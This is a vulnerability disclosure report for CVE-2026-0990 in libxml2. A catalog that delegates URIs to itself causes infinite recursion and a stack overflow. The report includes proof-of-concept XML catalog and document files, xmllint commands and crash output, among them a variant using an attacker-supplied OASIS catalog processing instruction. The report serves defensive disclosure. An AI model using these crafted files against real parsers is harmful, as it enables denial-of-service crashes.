(CVE-2026-0990) Infinite recursion in xmlCatalogXMLResolveURI

xmlCatalogXMLResolveURI will recurse infinitely if a catalog has a URI delegate referencing itself, eventually resulting in a call stack overflow.

Proof of concept

XML catalog catalog.xml, referencing itself:

<catalog xmlns="urn:oasis:names:tc:entity:xmlns:xml:catalog">
    <delegateURI uriStartString="foo" catalog="catalog.xml"/>
</catalog>

XML file poc.xml:

<!DOCTYPE doc [
    <!ENTITY e SYSTEM "foo.ent">
]>
<doc>&e;</doc>

Now parse the file using the catalog with xmllint. Note that in the typical case, catalogs are loaded and parsed lazily, so an external entity or DTD must be referenced to trigger the issue. Here we use --noent and an external entity.

% XML_CATALOG_FILES=catalog.xml build/xmllint --noent poc.xml
AddressSanitizer:DEADLYSIGNAL
=================================================================
==23121==ERROR: AddressSanitizer: stack-overflow on address 0x00016afb7f80 (pc 0x000105101b70 bp 0x00016afb8260 sp 0x00016afb7f80 T0)
    #0 0x000105101b70 in xmlCatalogXMLResolveURI catalog.c:1826
    #1 0x0001050f68b8 in xmlCatalogListXMLResolveURI catalog.c:2087
    #2 0x00010510227c in xmlCatalogXMLResolveURI catalog.c:1923
    #3 0x0001050f68b8 in xmlCatalogListXMLResolveURI catalog.c:2087
    ...
    #253 0x0001050f68b8 in xmlCatalogListXMLResolveURI catalog.c:2087
    #254 0x00010510227c in xmlCatalogXMLResolveURI catalog.c:1923

SUMMARY: AddressSanitizer: stack-overflow catalog.c:1826 in xmlCatalogXMLResolveURI
==23121==ABORTING

PoC with OASIS catalog PI

While it's unlikely that anyone uses untrusted system catalogs, libxml2 before 2.14 allows OASIS catalog processing instructions by default, so this bug can also be triggered with a "local" catalog provided by an attacker. For example, with the catalog above and XML file poc-pi.xml

<?oasis-xml-catalog catalog="catalog.xml"?>
<!DOCTYPE doc [
    <!ENTITY % e SYSTEM "foo.ent">
    %e;
]>
<doc/>

and stock xmllint from macOS which is still on 2.9.13:

% xmllint --noent poc-pi.xml
zsh: segmentation fault  xmllint --noent poc-pi.xml

Additional remarks

This report is subject to a 90-day disclosure deadline. Please attribute  the discovery to Nick Wellnhofer.

I'm currently working on the first release of my fork of libxml2 which will contain a fix for this issue and I haven't decided yet whether to coordinate vulnerability disclosures with upstream libxml2. If the bug is still unfixed upstream, I'll make sure that the issue won't be too obvious when looking at commit messages.
